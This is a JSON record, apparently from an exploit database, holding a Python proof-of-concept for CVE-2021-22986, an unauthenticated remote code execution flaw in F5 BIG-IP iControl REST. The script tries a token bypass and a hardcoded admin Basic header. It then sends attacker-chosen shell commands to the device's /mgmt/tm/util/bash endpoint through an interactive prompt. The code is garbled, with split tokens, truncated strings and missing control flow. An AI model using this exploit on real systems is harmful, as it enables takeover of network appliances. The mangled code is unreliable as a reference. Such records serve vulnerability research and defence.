{
    "text": "vul_name : F5 BIG-IP 16.0.x Remote Code Execution ， vul_cve : CVE-2021-22986 ， vul_poc :  # Exploit Title : F5 BIG-IP 16.0.x - iControl REST Remote Code Execution ( Unauthenticated )  ，  # Exploit Author : Al1ex ，  # Vendor Homepage :  ，  # Version : 16.0.x before 16.0.1.1 , 15.1.x before 15.1.2.1 , 14.1.x before 14.1.4 , 13.1.x before 13.1.3.6 , and 12.1.x before 12.1.5.3 amd BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2 ，  # CVE : CVE-2021-22986 ， from requests.packages.urllib3.exceptions import InsecureRequestWarning ， requests.packages.urllib3.disable_warnings ( InsecureRequestWarning )  ， print ( ' ， _ _ _ _ _ _ _ _ _ _ _ _ _ ， / | \\ \\ / / | _ |  | _ \\ / _ \\ | _ \\ /_ |  | _ \\ | _ \\ / _ \\ / _ \\ / / ，  |  , -' \\ \\/ / |  | _ _ )  |  |  |  |  |  )  |  |  | _ )  |  )  |  |  ( _ )  |  |  ( _ )  | / /_ ，  |  | \\ / | _ |  | _/ / |  |  |  | / / |  |  | _/ / / / \\_ ,  | > _ < | '_ \\ ，  | `-. \\ / |  | _ / /_ |  | _ |  | / /_ |  | / /_ / /_ / / |  ( _ )  |  |  ( _ )  |  ， \\_ | \\_/ | _ |  | _ | \\_/ | _ |  | _ |  | _ |  | _ | /_/ \\_/ \\_/ ， Author : Al1ex @ Heptagram ， Github :  ， ' )  ， target_url = url + '/mgmt/shared/authn/login' ， data = { ， \"bigipAuthCookie\" : \" ,  ， \"username\" : \"admin\" ,  ， \"login ， \"user ， } ， headers = { ， \"User-Agent\" : \"hello-world\" ,  ， \"Content-Type\" : \"application/x-www-form-urlencoded\" ， } ， response = requests.post ( target_url , headers=headers , json=data , verify=False , timeout=15 )  ， print ( ' ( - ) Get token fail ! ' )  ， print ( ' (  *  ) Tested Method 2 : ' )  ， header_2 = { ， 'User-Agent' : 'hello-world' ,  ， 'Content-Type' : 'application/json' ,  ， 'X-F5-Auth-Token' : ' ,  ， 'Authorization' : 'Basic YWRtaW46QVNhc1M=' ， } ， data_2 = { ， \"command\" : \"run\" ,  ， \"utilCmdArgs\" : \"-c whoami\" ， } ， check_url = url + '/mgmt/tm/util/bash' ， response2 = requests.post ( url=check_url , json=data_2 , headers=header_2 , verify=False , timeout=20 )  ， cmd = input ( \" (  : CMD ) > \" )  ， data_3 = {\"command\" : \"run\" , \"utilCmdArgs\" : \"-c '%s'\"% ( cmd ) } ， r = requests.post ( url=check_url , json=data_3 , headers=header_2 , verify=False )  ， print ( r.text.split ( 'commandResult\" : \"' )  [ 1 ] .split ( '\"}' )  [ 0 ] .replace ( '\\n' , ' )  ， print ( ' ( - ) Not vuln.' )  ， exit ( 0 )  ， print ( 'ERROR Connect' )  ， print ( ' ( + ) Extract token : %s'% ( response.text.split ( '\"selfLink\" : \" ， cmd = input ( \" (  : CMD ) > \" )  ， headers = { ， \"Content-Type\" : \"application/json\" ,  ， \"X-F5-Auth-Token\" : \"%s\"% ( response.text.split ( '\"selfLink\" : \" ， } ， data_json = { ， \"command\" : \"run\" ,  ， \"utilCmdArgs\" : \"-c \\'%s\\'\"% ( cmd )  ， } ， exp_url= url + '/mgmt/tm/util/bash' ， exp_req = requests.post ( exp_url , headers=headers , json=data_json , verify=False , timeout=15 )  ， print ( exp_req.text.split ( 'commandResult\" : \"' )  [ 1 ] .split ( '\"}' )  [ 0 ] .replace ( '\\n' , ' )  ， print ( ' ( - ) Not vuln.' )  ， exit ( 0 )  ， title (  )  ， print ( ' [ + ] USAGE : python3 %s ， exit ( 0 )  ， exploit ( sys.argv [ 1 ]  ) ",
    "time": "2021.04.03"
}